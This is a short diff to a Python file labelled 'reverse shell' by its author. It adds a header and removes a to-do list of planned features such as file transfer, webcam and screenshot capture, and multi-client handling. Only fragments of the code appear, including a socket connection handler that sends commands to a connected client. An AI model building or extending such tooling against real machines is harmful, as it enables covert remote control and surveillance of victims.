@@ -1,3 +1,10 @@
+'''
+    reverse shell
+    
+    author @ Himanshu Bag :-)
+'''
+
+
 import socket
 import sys
 
@@ -59,23 +66,6 @@ print('-'*80)
 print('[*] Connected To IP : {0} | Port : {1}'.format(ad[0],ad[1])+'\n')
 send_commands(con,ad)
 con.close()
-
-
-
-
-'''
-
-To do :-
-   1.) Banner 
-   2.) transfer of file
-   3.) test for web cam & screen shot and then download them (option 2)
-   4.) multiple client
-   5.) handle broken pipes
-   6.) enhance the user experience
-
-   intution: 1.) can i get the clients env. detail (win /mac/ linux) by python cmds?
-
-'''
 
 
 
